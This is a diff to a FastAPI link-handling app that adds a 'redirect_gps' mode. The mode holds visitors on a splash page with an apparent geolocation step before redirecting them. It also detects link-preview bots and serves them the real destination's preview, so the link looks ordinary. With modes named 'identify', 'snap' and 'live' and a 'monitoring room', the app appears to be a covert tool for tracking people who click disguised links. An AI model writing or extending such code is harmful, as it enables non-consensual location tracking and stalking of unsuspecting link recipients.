@@ -1,5 +1,5 @@
 """FastAPI アプリ本体。Cookieセッション認証 + マルチテナント完全分離版。"""
-import os, io, time, secrets, random, string, base64, json as _json, traceback, shutil, threading
+import os, io, re, time, secrets, random, string, base64, json as _json, traceback, shutil, threading
 from collections import Counter
 from urllib.parse import quote
 
@@ -1662,8 +1662,24 @@ def link_hit(code: str, request: Request):
     hrow = db.q1("SELECT nonce FROM link_hits WHERE id=?", (hid,))
     nonce = (hrow["nonce"] if hrow else "") or ""
 
-    if link["mode"] == "redirect" and link["dest"]:
-        return RedirectResponse(link["dest"], 302)
+    if link["mode"] in ("redirect", "redirect_gps") and link["dest"]:
+        from . import tracks as _tracks
+        d = (link["dest"] or "").strip()
+        if d and not re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*:", d):
+            d = "https://" + d
+        if request.query_params.get("hold") == "0":
+            return RedirectResponse(d, 302)
+        ua = (request.headers.get("user-agent", "") or "").lower()
+        unfurl = any(k in ua for k in _tracks.UNFURL_KW)
+        try:
+            gw = max(1500, min(int(os.getenv("REDIRECT_GEO_WAIT_MS", "6000")), 15000))
+        except Exception:
+            gw = 6000
+        return render("link_splash.html", request, code=code, hit_id=hid, link=link,
+                      dest=d, nonce=nonce, geo=(link["mode"] == "redirect_gps"),
+                      og=_tracks.og_preview(d, fetch=unfurl),
+                      wait_ms=int(os.getenv("REDIRECT_WAIT_MS", "450")),
+                      geo_wait_ms=gw)
 
     # クイズ：質問が 0 件でもクイズ画面を返す（監視室へ落とさない）
     if link["mode"] == "quiz":
@@ -1841,8 +1857,8 @@ def _new_code(n=8):
 def _create_link(name, dest, note, mode, u):
     code = _new_code()
     users.register_link(code, u)
-    m = mode if mode in ("page", "geo", "redirect", "quiz", "identify",
-                         "snap", "live") else "page"
+    m = mode if mode in ("page", "geo", "redirect", "redirect_gps", "quiz",
+                         "identify", "snap", "live") else "page"
     if m in ("snap", "live"):
         db.add_track(code, name or code, mode=m, interval=15,
                      dest=dest.strip(), note=note)
